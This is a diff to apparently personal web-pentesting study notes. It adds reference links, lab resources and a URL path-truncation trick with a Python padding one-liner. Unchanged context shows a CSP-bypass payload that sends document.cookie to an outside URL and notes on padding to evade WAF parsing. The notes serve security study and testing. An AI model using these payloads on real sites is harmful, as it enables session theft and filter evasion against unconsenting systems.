@@ -1,7 +1,8 @@
 # +
 
-- ./javascript.md
-- ./fuzzing.md
+- [javascript](./javascript.md)
+- [fuzzing](./fuzzing.md)
+- [net](./net.md)
 
 - https://portswigger-labs.net/hackability/inspector/index.php?input=window
 - [HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
@@ -10,14 +11,18 @@
 - https://book.hacktricks.xyz/pentesting/pentesting-web
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - http://pentestmonkey.net/category/cheat-sheet
-- https://cheatsheetseries.owasp.org/Glossary.html
-- https://owasp.org/www-community/attacks/
+- https://owasp.org/www-project-web-security-testing-guide/stable/
+    - https://owasp.org/www-community/attacks/
+    - https://cheatsheetseries.owasp.org/Glossary.html
 - The Web Application Hacker's Handbook
 
 # labs
 
 - https://portswigger.net/web-security
 - https://pentesterlab.com/exercises
+- https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/
+    - https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html
+    - https://hub.docker.com/r/bkimminich/juice-shop
 
 # information disclosure
 
@@ -74,6 +79,7 @@ if _name__ == "__main__":
     - mitigations: http-only, secure
 - ssl strip
     - mitigations: Strict-Transport-Security (HSTS)
+        - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
 
 - https://medium.com/@muratkaraoz/web-app-pentest-cheat-sheet-c17394af773
 
@@ -423,6 +429,8 @@ Mitigations:
         - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
         - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
             - [Bypass unsafe\-inline mode CSP](https://paper.seebug.org/91/)
+- Checksum for requested resources (e.g. CDN .js)
+    - https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
 
 Polyglots:
 
@@ -763,7 +771,10 @@ nginx:
     - https://owasp.org/www-community/attacks/Cache_Poisoning
 - https://haboob.sa/ctf/nullcon-2019/babyJs.html
     - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
-- On payload parsing truncation, use newline padding
+- URL path truncation - use `/..` padding
+    - `python -c 'print("http://foo?page=a/../admin.html"+"/."*2027)'`
+    - http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20path%20truncation.html
+- Payload parsing truncation - use newline padding
     - [How to bypass the Cloudflare WAF using a padding technique \- Swascan](https://www.swascan.com/cloudflare/)
     - https://support.cloudflare.com/hc/en-us/articles/200172016-Understanding-the-Cloudflare-Web-Application-Firewall-WAF-
         > The Cloudflare WAF parses JSON responses to identify vulnerabilities targeted at APIs. The WAF limits JSON payload parsing to 128 KB
